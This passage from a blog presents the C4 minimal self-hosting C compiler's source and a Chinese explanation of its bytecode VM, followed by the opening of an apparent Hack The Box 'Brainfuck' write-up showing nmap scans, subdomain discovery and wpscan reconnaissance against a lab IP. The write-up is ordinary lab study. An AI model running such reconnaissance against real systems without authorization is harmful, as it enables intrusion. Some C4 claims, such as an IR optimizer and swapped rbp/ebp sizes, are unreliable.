class="line"><span class="string">          next();</span></span><br><span class="line"><span class="string">          if (tk == &#x27;,&#x27;) next();</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">//為局部變數的入棧申請空間</span></span><br><span class="line"><span class="string">        next();</span></span><br><span class="line"><span class="string">        if (tk != &#x27;&#123;&#x27;) &#123; printf(&quot;</span>%d: bad function definition\n<span class="string">&quot;, line); return -1; &#125;</span></span><br><span class="line"><span class="string">        loc = ++i;//局部變數偏移量</span></span><br><span class="line"><span class="string">        next();</span></span><br><span class="line"><span class="string">        while (tk == Int || tk == Char) &#123;//函數內變數聲明</span></span><br><span class="line"><span class="string">          bt = (tk == Int) ? INT : CHAR;</span></span><br><span class="line"><span class="string">          next();</span></span><br><span class="line"><span class="string">          while (tk != &#x27;;&#x27;) &#123;</span></span><br><span class="line"><span class="string">            ty = bt;</span></span><br><span class="line"><span class="string">            while (tk == Mul) &#123; next(); ty = ty + PTR; &#125;//處理指標型</span></span><br><span class="line"><span class="string">            if (tk != Id) &#123; printf(&quot;</span>%d: bad local declaration\n<span class="string">&quot;, line); return -1; &#125;</span></span><br><span class="line"><span class="string">            if (id[Class] == Loc) &#123; printf(&quot;</span>%d: duplicate local definition\n<span class="string">&quot;, line); return -1; &#125;</span></span><br><span class="line"><span class="string">//備份符號訊息</span></span><br><span class="line"><span class="string">            id[HClass] = id[Class]; id[Class] = Loc;</span></span><br><span class="line"><span class="string">            id[HType]  = id[Type];  id[Type] = ty;</span></span><br><span class="line"><span class="string">            id[HVal]   = id[Val];   id[Val] = ++i;//儲存變數偏移量</span></span><br><span class="line"><span class="string">            next();</span></span><br><span class="line"><span class="string">            if (tk == &#x27;,&#x27;) next();</span></span><br><span class="line"><span class="string">          &#125;</span></span><br><span class="line"><span class="string">          next();</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">//為局部變數的入棧申請空間</span></span><br><span class="line"><span class="string">        *++e = ENT; *++e = i - loc;//函式局部變數數目</span></span><br><span class="line"><span class="string">        while (tk != &#x27;&#125;&#x27;) stmt();//語法分析</span></span><br><span class="line"><span class="string">        *++e = LEV;//函數回傳,解析完畢,彈棧</span></span><br><span class="line"><span class="string">        id = sym; //恢復全域變數的訊息</span></span><br><span class="line"><span class="string">        while (id[Tk]) &#123;</span></span><br><span class="line"><span class="string">//恢復符號訊息</span></span><br><span class="line"><span class="string">          if (id[Class] == Loc) &#123;</span></span><br><span class="line"><span class="string">            id[Class] = id[HClass];</span></span><br><span class="line"><span class="string">            id[Type] = id[HType];</span></span><br><span class="line"><span class="string">            id[Val] = id[HVal];</span></span><br><span class="line"><span class="string">          &#125;</span></span><br><span class="line"><span class="string">          id = id + Idsz;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">      else &#123;</span></span><br><span class="line"><span class="string">        id[Class] = Glo;//全域變數</span></span><br><span class="line"><span class="string">        id[Val] = (int)data;//給全域變數在data段分配內存</span></span><br><span class="line"><span class="string">        data = data + sizeof(int);</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">      if (tk == &#x27;,&#x27;) next();</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    next();</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  if (!(pc = (int *)idmain[Val])) &#123; printf(&quot;</span>main() not defined\n<span class="string">&quot;); return -1; &#125;</span></span><br><span class="line"><span class="string">  if (src) return 0;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 設定堆疊</span></span><br><span class="line"><span class="string">  sp = (int *)((int)sp + poolsz);</span></span><br><span class="line"><span class="string">  *--sp = EXIT; // 如果main回傳則呼叫exit</span></span><br><span class="line"><span class="string">  *--sp = PSH; t = sp;</span></span><br><span class="line"><span class="string">  *--sp = argc;</span></span><br><span class="line"><span class="string">  *--sp = (int)argv;</span></span><br><span class="line"><span class="string">  *--sp = (int)t;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  // run...</span></span><br><span class="line"><span class="string">  cycle = 0;</span></span><br><span class="line"><span class="string">  while (1) &#123;</span></span><br><span class="line"><span class="string">    i = *pc++; ++cycle;</span></span><br><span class="line"><span class="string">    if (debug) &#123;</span></span><br><span class="line"><span class="string">//運算</span></span><br><span class="line"><span class="string">      printf(&quot;</span>%d&gt; %.<span class="number">4</span>s<span class="string">&quot;, cycle,</span></span><br><span class="line"><span class="string">        &amp;&quot;</span>LEA ,IMM ,JMP ,JSR ,BZ  ,BNZ ,ENT ,ADJ ,LEV ,LI  ,LC  ,SI  ,SC  ,PSH ,<span class="string">&quot;</span></span><br><span class="line"><span class="string">         &quot;</span>OR  ,XOR ,AND ,EQ  ,NE  ,LT  ,GT  ,LE  ,GE  ,SHL ,SHR ,ADD ,SUB ,MUL ,DIV ,MOD ,<span class="string">&quot;</span></span><br><span class="line"><span class="string">         &quot;</span>OPEN,READ,CLOS,PRTF,MALC,FREE,MSET,MCMP,EXIT,<span class="string">&quot;[i * 5]);</span></span><br><span class="line"><span class="string">      if (i &lt;= ADJ) printf(&quot;</span> %d\n<span class="string">&quot;, *pc); else printf(&quot;</span>\n<span class="string">&quot;);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">//記憶體結構</span></span><br><span class="line"><span class="string">    if      (i == LEA) a = (int)(bp + *pc++);                             // load local address</span></span><br><span class="line"><span class="string">    else if (i == IMM) a = *pc++;                                         // load global address or immediate</span></span><br><span class="line"><span class="string">    else if (i == JMP) pc = (int *)*pc;                                   // jump</span></span><br><span class="line"><span class="string">    else if (i == JSR) &#123; *--sp = (int)(pc + 1); pc = (int *)*pc; &#125;        // jump to subroutine</span></span><br><span class="line"><span class="string">    else if (i == BZ)  pc = a ? pc + 1 : (int *)*pc;                      // branch if zero</span></span><br><span class="line"><span class="string">    else if (i == BNZ) pc = a ? (int *)*pc : pc + 1;                      // branch if not zero</span></span><br><span class="line"><span class="string">    else if (i == ENT) &#123; *--sp = (int)bp; bp = sp; sp = sp - *pc++; &#125;     // enter subroutine</span></span><br><span class="line"><span class="string">    else if (i == ADJ) sp = sp + *pc++;                                   // stack adjust</span></span><br><span class="line"><span class="string">    else if (i == LEV) &#123; sp = bp; bp = (int *)*sp++; pc = (int *)*sp++; &#125; // leave subroutine</span></span><br><span class="line"><span class="string">    else if (i == LI)  a = *(int *)a;                                     // load int</span></span><br><span class="line"><span class="string">    else if (i == LC)  a = *(char *)a;                                    // load char</span></span><br><span class="line"><span class="string">    else if (i == SI)  *(int *)*sp++ = a;                                 // store int</span></span><br><span class="line"><span class="string">    else if (i == SC)  a = *(char *)*sp++ = a;                            // store char</span></span><br><span class="line"><span class="string">    else if (i == PSH) *--sp = a;                                         // push</span></span><br><span class="line"><span class="string">//執行流程</span></span><br><span class="line"><span class="string">    else if (i == OR)  a = *sp++ |  a;</span></span><br><span class="line"><span class="string">    else if (i == XOR) a = *sp++ ^  a;</span></span><br><span class="line"><span class="string">    else if (i == AND) a = *sp++ &amp;  a;</span></span><br><span class="line"><span class="string">    else if (i == EQ)  a = *sp++ == a;</span></span><br><span class="line"><span class="string">    else if (i == NE)  a = *sp++ != a;</span></span><br><span class="line"><span class="string">    else if (i == LT)  a = *sp++ &lt;  a;</span></span><br><span class="line"><span class="string">    else if (i == GT)  a = *sp++ &gt;  a;</span></span><br><span class="line"><span class="string">    else if (i == LE)  a = *sp++ &lt;= a;</span></span><br><span class="line"><span class="string">    else if (i == GE)  a = *sp++ &gt;= a;</span></span><br><span class="line"><span class="string">    else if (i == SHL) a = *sp++ &lt;&lt; a;</span></span><br><span class="line"><span class="string">    else if (i == SHR) a = *sp++ &gt;&gt; a;</span></span><br><span class="line"><span class="string">    else if (i == ADD) a = *sp++ +  a;</span></span><br><span class="line"><span class="string">    else if (i == SUB) a = *sp++ -  a;</span></span><br><span class="line"><span class="string">    else if (i == MUL) a = *sp++ *  a;</span></span><br><span class="line"><span class="string">    else if (i == DIV) a = *sp++ /  a;</span></span><br><span class="line"><span class="string">    else if (i == MOD) a = *sp++ %  a;</span></span><br><span class="line"><span class="string">//輸入輸出函數，包括了檔案讀寫、螢幕輸出等函數</span></span><br><span class="line"><span class="string">    else if (i == OPEN) a = open((char *)sp[1], *sp);</span></span><br><span class="line"><span class="string">    else if (i == READ) a = read(sp[2], (char *)sp[1], *sp);</span></span><br><span class="line"><span class="string">    else if (i == CLOS) a = close(*sp);</span></span><br><span class="line"><span class="string">    else if (i == PRTF) &#123; t = sp + pc[1]; a = printf((char *)t[-1], t[-2], t[-3], t[-4], t[-5], t[-6]); &#125;</span></span><br><span class="line"><span class="string">    else if (i == MALC) a = (int)malloc(*sp);</span></span><br><span class="line"><span class="string">    else if (i == FREE) free((void *)*sp);</span></span><br><span class="line"><span class="string">    else if (i == MSET) a = (int)memset((char *)sp[2], sp[1], *sp);</span></span><br><span class="line"><span class="string">    else if (i == MCMP) a = memcmp((char *)sp[2], (char *)sp[1], *sp);</span></span><br><span class="line"><span class="string">    else if (i == EXIT) &#123; printf(&quot;</span><span class="built_in">exit</span>(%d) cycle = %d\n<span class="string">&quot;, *sp, cycle); return *sp; &#125;</span></span><br><span class="line"><span class="string">    else &#123; printf(&quot;</span>unknown instruction = %d! cycle = %d\n<span class="string">&quot;, i, cycle); return -1; &#125;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>

<p>它具備完整的詞法分析、語法分析、簡單的語意檢查、程式碼產生、執行環境（即虛擬機器）。</p>
<p>與常見的C編譯器不同的是，它把C語言原始程式編譯成字節碼（bytecode），然後在一個精簡的虛擬機器中解釋執行。</p>
<p>C4特別的地方就是可以自己編譯自己</p>
<p>先用GCC把C4編譯成執行檔：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gcc c4.c -o c4</span><br></pre></td></tr></table></figure>

<p>執行「Hello, World!」測試程式hello.c：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;hello,world\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/img/c4_1.png" alt="Untitled"></p>
<p>「hello, world」是hello.c 輸出的，「exit(0) cycle &#x3D; 9」是c4編譯器輸出的，表示程式正常運作結束，hello.c一共產生9個指令。</p>
<p>用GCC編譯c4.c產生了可執行檔c4，稱為編譯器A，然後用編譯器A來編譯c4的源碼c4.c，則產生一個編譯器B，然後再用編譯器B來編譯執行hello.c。</p>
<p><img src="/img/c4_2.png" alt="Untitled"></p>
<p>命令如下：</p>
<p>.&#x2F;c4 c4.c hello.c</p>
<p><img src="/img/c4_3.png" alt="Untitled"></p>
<p>理論上可以一直遞歸下去。遞歸的層次越深，產生的字節碼越多，執行所需的時間也越多。</p>
<p>C4實作的C語言子集<br>C4致力於用最少的程式碼，實作一個可以自舉的C編譯器。它的整個實作只有4個函數組成，可想而知，它不可能完整的實作整個C語言的規範，它只實作了C語言的一個子集。</p>
<h3 id="資料類型"><a href="#資料類型" class="headerlink" title="資料類型"></a>資料類型</h3><ul>
<li>char</li>
<li>int</li>
<li>指針</li>
<li>列舉（enum）</li>
<li>陣列</li>
<li>字串</li>
<li>不支援struct、typedef、union等資料類型。</li>
</ul>
<h3 id="語句結構"><a href="#語句結構" class="headerlink" title="語句結構"></a>語句結構</h3><ul>
<li>if-else控制語句</li>
<li>while迴圈語句</li>
<li>return語句</li>
<li>函數</li>
<li>不支援do-while、switch-case、for、continue、break、goto等語句結構。</li>
</ul>
<h3 id="運算符"><a href="#運算符" class="headerlink" title="運算符"></a>運算符</h3><p>它支援除+&#x3D;、%&#x3D;、&lt;&lt;&#x3D;、&amp;&#x3D;等符合運算子之外的幾乎所有運算子。包括：</p>
<ul>
<li><p>算術運算符</p>
</li>
<li><p>關係運算符</p>
</li>
<li><p>邏輯運算符</p>
</li>
<li><p>位元運算符</p>
</li>
<li><p>賦值運算符</p>
</li>
<li><p>雜項運算子（如三元運算子?:）</p>
</li>
<li><p>內建庫函數</p>
</li>
<li><p>Virtual Machine (c4)</p>
<ul>
<li>sp：stack frame。</li>
<li>a：register 暫存器。</li>
<li>bp：概念跟 rbp(32 bits)&#x2F;ebp(64 bits) 相同。</li>
<li>pc：program counter，指向當前指令。</li>
<li>instuction：OPCODE。</li>
</ul>
</li>
</ul>
<h3 id="內建庫函數"><a href="#內建庫函數" class="headerlink" title="內建庫函數"></a>內建庫函數</h3><p>C4編譯器實作時用到了一些系統函式庫函數，因此，為了實現自舉，它也內建支援了幾個函式庫函數。包括：</p>
<p>open、read、close、printf、malloc、free、memset、memcmp、exit<br>需要注意的是，它不支援以#開頭的預處理命令，如#include、#define、#if等。</p>
<p>程式碼註釋只支援「&#x2F;&#x2F;」開頭的單行註釋，不支援「&#x2F;* *&#x2F;」標記的多行註解形式。</p>
<p>與傳統的C語言編譯器相比，C4在實作上有其獨到之處。</p>
<p>下面，先簡單介紹一些傳統編譯器的實作過程。</p>
<h3 id="傳統典型編譯器的實現"><a href="#傳統典型編譯器的實現" class="headerlink" title="傳統典型編譯器的實現"></a>傳統典型編譯器的實現</h3><p>典型的編譯器的實現，通常都會有下面幾個過程：</p>
<ul>
<li>詞法分析</li>
<li>語法分析</li>
<li>語意分析</li>
<li>中間程式碼生成</li>
<li>程式碼最佳化</li>
<li>機器碼生成</li>
<li>如GCC、Clang….</li>
</ul>
<p><img src="/img/c4_4.png" alt="Untitled"></p>
<p>這些階段，會對程式碼進行多次掃描。這裡的程式碼，包括文字形式的原始碼、語法樹、中間程式碼等表示形式。</p>
<p>在典型的實作中，詞法分析和語法分析通常會糅合在一起，在語法分析時，呼叫詞法分析器逐一取得token。因此，理論上講，詞法分析和語法分析階段，只需要對源碼掃描一遍即可，並生成語法樹，有時也叫抽象語法樹（Abstract Syntax Tree）。</p>
<p>語意分析階段操作的主要物件就是這棵樹，至少要對這棵樹掃描一次。有些實作中，在進行語意檢查的同時也會直接產生中間程式碼。</p>
<p>在程式碼最佳化階段，根據編譯器最佳化的力度的不同，可能會對中間程式碼進行多次掃描。</p>
<p>這裡所謂的“掃描一遍”，在編譯器術語中一般稱為pass。對LLVM有了解的朋友應該知道，LLVM中每一種類型的最佳化都是一個pass，要應用多種最佳化技術，就需要有多個pass。</p>
<h3 id="程式流程"><a href="#程式流程" class="headerlink" title="程式流程"></a>程式流程</h3><p>總結這個程式的流程﻿ 1. 詞法分析器：</p>
<ul>
<li>忽略空白字元</li>
<li>識別符號、關鍵字、運算符、常數、字串等</li>
<li>將識別符號雜湊並儲存在符號表中</li>
</ul>
<ol start="2">
<li><p>語法分析器：</p>
<ul>
<li>遞迴下降解析器</li>
<li>處理表達式、語句和函數定義</li>
<li>產生中間代碼（IR → Instruction register）</li>
</ul>
</li>
<li><p>IR 優化器：</p>
<ul>
<li>進行常數摺疊、公共子表達式消除等優化</li>
</ul>
</li>
<li><p>程式碼生成器：</p>
<ul>
<li>將 IR 轉換為目標機器碼</li>
</ul>
</li>
<li><p>虛擬機：</p>
<ul>
<li>模擬目標機器執行機器碼</li>
<li>提供除錯功能</li>
</ul>
</li>
</ol>
<h3 id="解析程式流程"><a href="#解析程式流程" class="headerlink" title="解析程式流程"></a><strong>解析程式流程</strong></h3><ol>
<li><strong>詞法分析</strong>：將原始碼切割成一個個的 token，並賦予其對應的 token number。</li>
</ol>
<ul>
<li>詞法分析器會逐個字元地掃描原始碼，並將字元組合成 token。</li>
<li>token 是原始碼中具有特定意義的字元序列，例如關鍵字、識別符號、運算符、分隔符等。</li>
<li>詞法分析器會將 token 分配給對應的 token number，以便後續的語法分析和語義分析。</li>
</ul>
<ol>
<li><strong>語法分析</strong>：將 token 組合起來，形成語法樹。</li>
</ol>
<ul>
<li>語法分析器會根據當前的 token 和語法規則，決定如何將 token 組合起來形成語法樹。</li>
<li>語法樹是一種樹狀結構，它表示原始碼的語法結構。</li>
<li>語法分析器會檢查語法樹是否符合語法規則，如果發現語法錯誤，則會報錯。</li>
</ul>
<ol>
<li><strong>語義分析</strong>：檢查語法樹是否符合語法規則，並產生對應的 IR (Intermediate Representation) 指令。</li>
</ol>
<ul>
<li>語義分析器會檢查語法樹是否符合語法規則，並產生對應的 IR 指令。</li>
<li>IR 指令是一種中間表示，它比機器碼更接近原始碼，但又比原始碼更接近機器碼。</li>
<li>IR 指令可以被編譯器轉換成機器碼。</li>
</ul>
<ol>
<li><strong>程式碼生成</strong>：將 IR 指令轉換成機器碼。</li>
</ol>
<ul>
<li>程式碼生成器會將 IR 指令轉換成機器碼。</li>
<li>機器碼是電腦可以直接執行的指令。</li>
</ul>
<ol>
<li><strong>執行</strong>：將機器碼載入到記憶體中，並執行。</li>
</ol>
<ul>
<li>執行器會將機器碼載入到記憶體中，並執行。</li>
<li>電腦會根據機器碼的指令，一步一步地執行程式。</li>
</ul>
<p>在這個專案程式中，詞法分析、語法分析、語義分析和代碼生成都是由同一個程式來完成的。</p>
<p>這個程式會逐行讀取原始碼，並將原始碼轉換成機器碼。然後，程式會將機器碼載入到記憶體中，並執行。</p>
<h3 id="C4的獨具特色之處"><a href="#C4的獨具特色之處" class="headerlink" title="C4的獨具特色之處"></a>C4的獨具特色之處</h3><p>作為追求極簡主義的C4編譯器來說，它在實作上有許多獨具特色之處。</p>
<h3 id="對C源碼解釋執行"><a href="#對C源碼解釋執行" class="headerlink" title="對C源碼解釋執行"></a>對C源碼解釋執行</h3><p>傳統的C語言編譯器，最後都把C語言原始碼編譯成可執行文件，也就是二進位的機器碼。</p>
<p>而C4則是把C語言原始碼先編譯成其專門設計的字節碼（bytecode），然後直接在虛擬機器中解釋執行。</p>
<p>C4設計了39個字節碼指令，其中大部分與彙編語言中的指令有些類似，主要是記憶體載入指令，算術運算指令等，此外，還包含了為支援內建的函式庫函數而專門設計的9條特殊的函式庫函數呼叫指令。</p>
<p>它的虛擬機是典型的堆疊式虛擬機（Java虛擬機也是典型的堆疊式虛擬機，早期的Lua也是棧式虛擬機，但最新的Lua 5.x採用暫存器虛擬機）。</p>
<p>可以使用-d指令，把產生的字節碼dump出來。下圖是hello.c的字節碼：</p>
<p><img src="/img/c4_5.png" alt="Untitled"></p>
<p><strong>對源碼只掃描一遍</strong></p>
<p>與傳統的編譯器實作不同，C4它把詞法分析、語法分析、語意分析、程式碼產生這幾個步驟巧妙的結合在一起，在把C語言源碼編譯成字節碼的整個過程中，只掃描了一遍源碼。</p>
<p>Lua的解釋器也是採用對原始碼掃描一遍的方式，因此，C4和Lua的表現都相當不錯。</p>
<h3 id="C4原始碼的可讀性"><a href="#C4原始碼的可讀性" class="headerlink" title="C4原始碼的可讀性"></a><strong>C4原始碼的可讀性</strong></h3><p>C4的實作非常簡潔，畢竟只有4個函數，500多行程式碼。但是要真正完全理解，需要有一定的編譯原理基礎知識。</p>
<p>例如C4的語法分析過程中，就是<strong>典型的遞歸下降和算子優先演算法結合</strong>的實作方式。只要了解這些編譯器的經典演算法原理，C4的實作邏輯理解起來，還是比較輕鬆的。</p>
<p>C4不支援struct類型。這也意味著C4的源碼中不能使用struct型別。為此，它選擇<strong>使用陣列</strong>來模擬struct結構。這樣乍看，可能會產生一些困惑。</p>
<p>C4的一個槽點，就是它變數的命名上，過於簡潔。例如標記字節碼的位置的變數用e表示，其實如果用emit的話，就會清晰許多，也會更容易理解。</p>
<h3 id="C4的衍生實現"><a href="#C4的衍生實現" class="headerlink" title="C4的衍生實現"></a>C4的衍生實現</h3><p>除了C4的原生實作外，網路上也有很多基於C4的衍生實作。</p>
<p>例如有人為C4額外增加了80多行程式碼，卻為C4增加了JIT功能，使得執行速度明顯提升。</p>
<p>也有人對C4做了簡單修改，使得它可以直接產生真實的機器碼，最後產生ELF執行檔。</p>
<h3 id="Virtual-Machine-Opcode"><a href="#Virtual-Machine-Opcode" class="headerlink" title="Virtual Machine (Opcode)"></a><strong>Virtual Machine (Opcode)</strong></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// opcodes</span><br><span class="line">enum &#123; LEA ,IMM ,JMP ,JSR ,BZ  ,BNZ ,ENT ,ADJ ,LEV ,LI  ,LC  ,SI  ,SC  ,PSH ,</span><br><span class="line">       OR  ,XOR ,AND ,EQ  ,NE  ,LT  ,GT  ,LE  ,GE  ,SHL ,SHR ,ADD ,SUB ,MUL ,DIV ,MOD ,</span><br><span class="line">       OPEN,READ,CLOS,PRTF,MALC,FREE,MSET,MCMP,EXIT &#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://i.imgur.com/pcp5DfL.png" alt="https://i.imgur.com/pcp5DfL.png"></p>
<table>
<thead>
<tr>
<th>Opcode</th>
<th>Fully Name</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>LEA</td>
<td>Load Effective Address</td>
<td>利用 bp 將相對位址存入暫存器 a</td>
</tr>
<tr>
<td>IMM</td>
<td>Immediate Value</td>
<td>將 immediate value or global address 存入暫存器 a</td>
</tr>
<tr>
<td>JMP</td>
<td>Jump</td>
<td>跳轉至目標指令的絕對位址</td>
</tr>
<tr>
<td>JSR</td>
<td>Jump to SubRoutine</td>
<td>Push return address into sp and JMP</td>
</tr>
<tr>
<td>BZ</td>
<td>Branch if Zero</td>
<td>後面接的是目標指令的絕對位址</td>
</tr>
<tr>
<td>BNZ</td>
<td>Branch if NOT Zero</td>
<td>後面接的是目標指令的絕對位址</td>
</tr>
<tr>
<td>ENT</td>
<td>Enter SubRoutine</td>
<td>Push bp and bp points to sp，sp 會預留 local variables 的位置</td>
</tr>
<tr>
<td>ADJ</td>
<td>Stack Adjust</td>
<td>根據目前 sp 的相對位置</td>
</tr>
<tr>
<td>LEV</td>
<td>Leave SubRoutine</td>
<td>sp&#x3D;bp, bp points to old bp, 讀取 return address to pc, sp++釋放空間</td>
</tr>
<tr>
<td>LI</td>
<td>Load INT</td>
<td>將暫存器 a 所指的位址取值，存入暫存器 a</td>
</tr>
<tr>
<td>LC</td>
<td>Load CHAR</td>
<td>將暫存器 a 所指的位址取值，存入暫存器 a</td>
</tr>
<tr>
<td>SI</td>
<td>Store INT</td>
<td>將暫存器 a 取值，存入 stack frame sp 所指的位址，然後 sp++</td>
</tr>
<tr>
<td>SC</td>
<td>Store CHAR</td>
<td>將暫存器 a 取值，存入 stack frame sp 所指的位址，然後 sp++，最後再存入暫存器 a</td>
</tr>
<tr>
<td>PSH</td>
<td>Push into Stack Frame</td>
<td>將暫存器 a 的值 push into Stack Frame</td>
</tr>
<tr>
<td>OR-MODE</td>
<td>Arithmetic operation</td>
<td>pop from Stack Frame and calculate with register value, and then restore into regrister.</td>
</tr>
<tr>
<td>OPEN-MEMCMP</td>
<td>System Call</td>
<td>使用 Stack Frame sp 當作參數傳遞，並且 pop Stack</td>
</tr>
<tr>
<td>EXIT</td>
<td>exit program</td>
<td>利用 Stack Frame sp 當作回傳值</td>
</tr>
</tbody></table>
<p>• c4 在 <code>next()</code> Lexical analyzer 的時候就有包含 semantic analyzer，這時候會建立 symbol table；在 <code>main()</code> 會檢查是否重複定義；在 <code>expr()</code> 會做 type checking and undefined variable checking，這些部分也是屬於 semantic analyzer。</p>
<h3 id="stmt"><a href="#stmt" class="headerlink" title="stmt()"></a><strong>stmt()</strong></h3><p>利用 recursive-descent 處理 “if-else”, “while”, “return”, “{}”, “;”。這部分的 source code 非常直觀</p>
<p>其他參考資料</p>
<p><a target="_blank" rel="noopener" href="https://github.com/lotabout/write-a-C-interpreter">https://github.com/lotabout/write-a-C-interpreter</a></p>
<p><a target="_blank" rel="noopener" href="https://hackmd.io/@srhuang/Bkk2eY5ES#main--declaration">https:&#x2F;&#x2F;hackmd.io&#x2F;@srhuang&#x2F;Bkk2eY5ES#main–declaration</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/rswier/c4/blob/master/c4.c">https://github.com/rswier/c4/blob/master/c4.c</a></p>
<p><strong>特點：</strong></p>
<ul>
<li>簡單：僅用500餘行程式碼就實現了一個c編譯器。</li>
<li>類似解釋器：實現了自己的虛擬機器指令集，直接產生為目標程式碼，忽略中間程式碼的過程。</li>
<li>自舉：可以自己編譯自己。</li>
<li>只能在32位元環境下跑。</li>
<li>單趟編譯器：分析過程只有一遍。</li>
<li>語法分析屬於自頂向下分析法，表達式分析採了比較流行的用遞歸下降和運算子優先級方法結合的方式。</li>
</ul>
<p><strong>分析：</strong></p>
<ul>
<li>c4編譯器是一個非常簡單的編譯器，但它實現了編譯器的基本原理，是一個很好的學習資源。</li>
<li>c4編譯器類似於解釋器，它直接產生為目標程式碼，忽略中間程式碼的過程。這使得它比傳統的編譯器更簡單，但執行速度也更慢。</li>
<li>c4編譯器可以自己編譯自己，這是一個非常強大的功能。它意味著c4編譯器可以移植到任何支援C語言的平臺上。</li>
<li>c4編譯器是單趟編譯器，這意味著它在遍歷原始程式碼時只會分析一遍。這使得c4編譯器非常快，但它也意味著c4編譯器不能檢測出所有的錯誤。</li>
<li>c4編譯器的語法分析屬於自頂向下分析法，表達式分析採了比較流行的用遞歸下降和運算子優先級方法結合的方式。這使得c4編譯器的語法分析非常高效。</li>
</ul>
<p><strong>總結：</strong></p>
<p>c4編譯器是一個非常簡單、強大且高效的編譯器。它是一個很好的學習資源，也非常適合用於移植到其他平臺上。</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
    <article id="Brainfuck-Brainfuck" class="article article-type-Brainfuck" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/Brainfuck/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.076Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/Brainfuck/">
        HTB_Brainfuck
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Brainfuck"><a href="#Brainfuck" class="headerlink" title="Brainfuck"></a>Brainfuck</h1><ul>
<li><p>IP 10.129.228.97</p>
</li>
<li><p>tun0 10.10.16.11</p>
</li>
<li><p>nmap -sV -sC -A -T4 -Pn 10.129.228.97</p>
</li>
</ul>
<p><img src="/img/Brainfuck_Untitled.png" alt="Untitled"></p>
<ul>
<li>nmap -p 1-65535 -T4 -A -v 10.129.228.97</li>
</ul>
<p><img src="/img/Brainfuck_Untitled_1.png" alt="Untitled"></p>
<p><img src="/img/Brainfuck_Untitled_2.png" alt="Untitled"></p>
<p>find port</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Discovered open port 443/tcp on 10.129.228.97</span><br><span class="line">Discovered open port 22/tcp on 10.129.228.97</span><br><span class="line">Discovered open port 143/tcp on 10.129.228.97</span><br><span class="line">Discovered open port 25/tcp on 10.129.228.97</span><br><span class="line">Discovered open port 110/tcp on 10.129.228.97</span><br></pre></td></tr></table></figure>

<p>Because it is found that there is an nginx service that opens 443, so open the default webpage to confirm,SO..When we visit the localhost default web page</p>
<p><img src="/img/Brainfuck_Untitled_3.png" alt="Untitled"></p>
<p>Notice here that there are three domain names</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)</span><br><span class="line">| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR</span><br><span class="line">| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb</span><br><span class="line">| Issuer: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>sup3rs3cr3t.brainfuck.htb</strong></li>
<li><strong><a target="_blank" rel="noopener" href="http://www.brainfuck.htb/">www.brainfuck.htb</a></strong></li>
<li><strong>brainfuck.htb</strong></li>
</ul>
<p>now write &#x2F;etc&#x2F;hosts Add three domains to this file</p>
<p><img src="/img/Brainfuck_Untitled_4.png" alt="Untitled"></p>
<p>when I browse <a target="_blank" rel="noopener" href="https://brainfuck.htb/">https:&#x2F;&#x2F;**brainfuck.htb</a>** website,The webpage directly indicates that he is a wordpress website, and pointing to the SMTP mail ID <a href="mailto:&#111;&#x72;&#101;&#x73;&#116;&#x69;&#x73;&#64;&#x62;&#x72;&#x61;&#105;&#x6e;&#102;&#x75;&#x63;&#x6b;&#x2e;&#104;&#x74;&#98;">&#111;&#x72;&#101;&#x73;&#116;&#x69;&#x73;&#64;&#x62;&#x72;&#x61;&#105;&#x6e;&#102;&#x75;&#x63;&#x6b;&#x2e;&#104;&#x74;&#98;</a></p>
<p><img src="/img/Brainfuck_Untitled_5.png" alt="Untitled"></p>
<p>Check whether there are any types of vulnerable themes, plug-ins, user names, etc.</p>
<ul>
<li>Web Application Analysis (wpscan - WordPress vulnerability scanner)</li>
</ul>
<p>不管透過官方平台或是自己架設的WordPress網站，就都是這次介紹的工具<code>wpscan</code><br>鎖定的目標了，它位於Kali的<strong>Web Application Analysis</strong>分類之中，直接執行可以看到介紹與基本用法</p>
